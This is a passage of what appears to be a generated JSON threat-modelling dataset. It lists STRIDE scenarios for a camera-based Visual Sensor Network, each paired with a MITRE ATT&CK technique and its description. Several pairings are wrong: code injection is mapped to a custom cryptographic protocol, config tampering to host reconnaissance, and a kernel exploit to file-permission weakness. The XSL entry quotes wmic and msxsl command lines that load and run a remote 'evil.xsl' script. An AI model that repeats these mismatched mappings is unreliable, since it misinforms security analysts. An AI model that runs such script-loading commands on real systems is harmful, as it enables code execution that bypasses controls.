                "XML"
            ],
            "mitre_technique": {
                "name": "XSL Script Processing",
                "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>",
                "id": "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3",
                "technique_id": "T1220"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive configuration data is exposed via an unsecured API endpoint of the VSN.",
            "Assumptions": [
                {
                    "Assumption": "API endpoints lack sufficient access controls.",
                    "Role": "System Developer",
                    "Condition": "Inadequate API security controls."
                },
                {
                    "Assumption": "The attacker has knowledge of API structure and endpoints.",
                    "Role": "Attacker",
                    "Condition": "Understanding API documentation or trial-and-error."
                },
                {
                    "Assumption": "Sensitive data is transmitted without encryption.",
                    "Role": "System Architect",
                    "Condition": "Absence of encrypted communication channels."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive configuration data.",
            "MITRE ATT&CK Keywords": [
                "API",
                "data exposure",
                "information disclosure",
                "configuration data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts communication between camera nodes to gather sensitive visual data being transmitted.",
            "Assumptions": [
                {
                    "Assumption": "Communication between nodes is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Use of unencrypted communication protocols."
                },
                {
                    "Assumption": "The attacker has the capability to sniff network traffic.",
                    "Role": "Attacker",
                    "Condition": "Possessing network monitoring tools."
                },
                {
                    "Assumption": "No monitoring or detection mechanisms for unusual network activity.",
                    "Role": "System Administrator",
                    "Condition": "Lack of intrusion detection systems."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of visual data.",
            "MITRE ATT&CK Keywords": [
                "traffic interception",
                "data exfiltration",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack to disrupt the communication between camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "The VSN is accessible over the internet.",
                    "Role": "System Architect",
                    "Condition": "Publicly accessible network endpoints."
                },
                {
                    "Assumption": "The attacker can generate a high volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or high-performance systems."
                },
                {
                    "Assumption": "No rate limiting or traffic control mechanisms are in place.",
                    "Role": "System Administrator",
                    "Condition": "Absence of DDoS mitigation techniques."
                }
            ],
            "Potential Impact": "Disruption of VSN services leading to temporary data access loss.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network",
                "denial of service",
                "traffic overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability to cause a system crash on camera nodes, rendering them inoperable.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes have known vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or outdated software."
                },
                {
                    "Assumption": "The attacker can trigger the vulnerability at will.",
                    "Role": "Attacker",
                    "Condition": "Exploitation tools or scripts."
                },
                {
                    "Assumption": "No redundant systems to take over the load.",
                    "Role": "System Architect",
                    "Condition": "Lack of redundancy in network design."
                }
            ],
            "Potential Impact": "Loss of visual data capture functionality and reduced system availability.",
            "MITRE ATT&CK Keywords": [
                "crash",
                "vulnerability exploitation",
                "denial of service",
                "device"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the central server with resource exhaustion, preventing it from processing incoming visual data.",
            "Assumptions": [
                {
                    "Assumption": "Central server lacks resource management capabilities.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate system resource limits."
                },
                {
                    "Assumption": "The attacker can send a high volume of requests.",
                    "Role": "Attacker",
                    "Condition": "Access to resource-exhausting scripts."
                },
                {
                    "Assumption": "No load balancing or failover mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Absence of scalability solutions."
                }
            ],
            "Potential Impact": "Inability to process and store visual data, leading to data loss.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "denial of service",
                "server",
                "data processing"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits firmware vulnerabilities to gain root access on camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Camera firmware has known vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or outdated firmware."
                },
                {
                    "Assumption": "The attacker can distribute malicious firmware to the nodes.",
                    "Role": "Attacker",
                    "Condition": "Access to firmware update mechanisms."
                },
                {
                    "Assumption": "No integrity checks on firmware updates.",
                    "Role": "System Developer",
                    "Condition": "Lack of update verification processes."
                }
            ],
            "Potential Impact": "Complete control over camera nodes and unauthorized data manipulation.",
            "MITRE ATT&CK Keywords": [
                "firmware exploitation",
                "root access",
                "elevation of privilege",
                "device"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a remote code execution vulnerability on the central server to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The central server has exploitable vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched software or configurations."
                },
                {
                    "Assumption": "The attacker can execute arbitrary code remotely.",
                    "Role": "Attacker",
                    "Condition": "Access to remote code execution exploits."
                },
                {
                    "Assumption": "Lack of security monitoring and response measures.",
                    "Role": "System Architect",
                    "Condition": "Inadequate security practices."
                }
            ],
            "Potential Impact": "Full administrative control over the VSN system and potential data compromise.",
            "MITRE ATT&CK Keywords": [
                "remote code execution",
                "server",
                "elevation of privilege",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a vulnerability in the Linux kernel to escalate privileges from a regular user to a root user.",
            "Assumptions": [
                {
                    "Assumption": "The VSN relies on a vulnerable Linux distribution.",
                    "Role": "System Administrator",
                    "Condition": "Using outdated or unpatched kernel versions."
                },
                {
                    "Assumption": "The attacker has initial, low-level access to the system.",
                    "Role": "Attacker",
                    "Condition": "Access to user accounts through phishing or other means."
                },
                {
                    "Assumption": "Kernel patches are not regularly applied.",
                    "Role": "System Developer",
                    "Condition": "Lack of regular maintenance and updates."
                }
            ],
            "Potential Impact": "Unauthorized root access leading to system-wide compromise and data manipulation.",
            "MITRE ATT&CK Keywords": [
                "kernel vulnerability",
                "privilege escalation",
                "root access",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "5",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a camera node's identity to gain access to the Visual Sensor Network.",
            "Assumptions": [
                {
                    "Assumption": "The network relies on IP-based authentication for camera nodes.",
                    "Role": "Network administrator",
                    "Condition": "Network configuration."
                },
                {
                    "Assumption": "The attacker has access to the network or can connect to it externally.",
                    "Role": "Attacker",
                    "Condition": "Network security posture."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of visual data, potential network access, and unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use a malicious software update to install a spoofed firmware on a camera node.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks secure update mechanisms like signed firmware.",
                    "Role": "System developer",
                    "Condition": "Software design."
                },
                {
                    "Assumption": "The attacker can intercept firmware updates or have access to the update server.",
                    "Role": "Attacker",
                    "Condition": "Network security posture."
                }
            ],
            "Potential Impact": "Tampering with device behavior, disclosure of sensitive data, and system compromise.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "firmware",
                "malware",
                "update"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof user credentials to access the Visual Sensor Network's management interface.",
            "Assumptions": [
                {
                    "Assumption": "Users' credentials are not adequately protected.",
                    "Role": "System admin",
                    "Condition": "Credential management."
                },
                {
                    "Assumption": "The attacker can obtain or guess user credentials.",
                    "Role": "Attacker",
                    "Condition": "User behavior."
                }
            ],
            "Potential Impact": "Unauthorized control of the network, data tampering, and potential data extraction.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "management interface",
                "user access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with data in transit between camera nodes and the central server using a man-in-the-middle attack.",
            "Assumptions": [
                {
                    "Assumption": "Data is not properly encrypted during transit.",
                    "Role": "Network administrator",
                    "Condition": "Encryption policies."
                },
                {
                    "Assumption": "The attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                }
            ],
            "Potential Impact": "Corruption of visual data and potential injection of malicious data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "man-in-the-middle",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify the configuration files on camera nodes to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are stored locally on the device without proper access control.",
                    "Role": "Device manufacturer",
                    "Condition": "Storage security practices."
                },
                {
                    "Assumption": "The attacker has physical or remote access to the device.",
                    "Role": "Attacker",
                    "Condition": "Access control."
                }
            ],
            "Potential Impact": "Unintended camera behavior, potential data manipulation, and unauthorized system modifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "device access",
                "local files"
            ],
            "mitre_technique": {
                "name": "Gather Victim Host Information",
                "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
                "technique_id": "T1592"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could inject malicious code into visual processing algorithms used by the network.",
            "Assumptions": [
                {
                    "Assumption": "Algorithm code is not securely vetted or verified.",
                    "Role": "System developer",
                    "Condition": "Software development practices."
                },
                {
                    "Assumption": "The attacker has access to the code repository or update mechanism.",
                    "Role": "Attacker",
                    "Condition": "Repository security."
                }
            ],
            "Potential Impact": "Faulty data processing, potential data leak, and system exploitation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "algorithm",
                "repository"
            ],
            "mitre_technique": {
                "name": "Custom Cryptographic Protocol",
                "description": "Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.\n\nCustom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.\n\nSome adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. (Citation: F-Secure Cosmicduke)",
                "id": "attack-pattern--3b3cbbe0-6ed3-4334-b543-3ddfd8c5642d",
                "technique_id": "T1024"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could use the system without leaving an audit trail due to insufficient logging.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are either non-existent or poorly implemented.",
                    "Role": "System administrator",
                    "Condition": "Log management."
                },
                {
                    "Assumption": "The attacker has access to the system.",
                    "Role": "Attacker",
                    "Condition": "Access control."
                }
            ],
            "Potential Impact": "Difficulty in tracing malicious activities, hindering forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit trail",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
